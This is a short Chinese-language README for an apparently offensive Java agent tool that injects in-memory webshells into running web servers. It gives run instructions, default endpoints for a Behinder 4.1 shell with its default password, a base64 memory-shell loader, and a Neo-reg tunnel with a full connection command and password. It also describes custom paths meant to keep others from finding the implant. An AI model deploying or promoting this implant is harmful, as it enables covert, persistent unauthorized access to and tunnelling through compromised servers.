# 使用方式
扔到服务器上，`java -jar agenst.jar`即可。

如运行报错，考虑
1. 环境不正确，寻找一个jdk
2. 缺少dll或so文件，找一个attach.dll放在加载目录下（这是java agent注入的前置条件）

# 支持功能
1. 支持**冰蝎**、**Neo-reg**和**自定义的内存马**，内存马访问WEB进行注入。
2. 支持自定义校验机制，可采用请求头校验
3. 支持自定义注入路径，防止被捡走^ ^

## 默认条件启动
+ /agenstR 为冰蝎4.1 shell，默认密码为rebeyond
+ /agenstS 为自定义内存马加载器，使用POST方式在body处添加base64格式的内存马即可（内存马用JMG生成就行）
+ /agenstN 为Neo-reg代理，密码为donttouch python .\neoreg.py -k donttouch -u http://server.com/(..)/agenstN

#
by AugustTheodor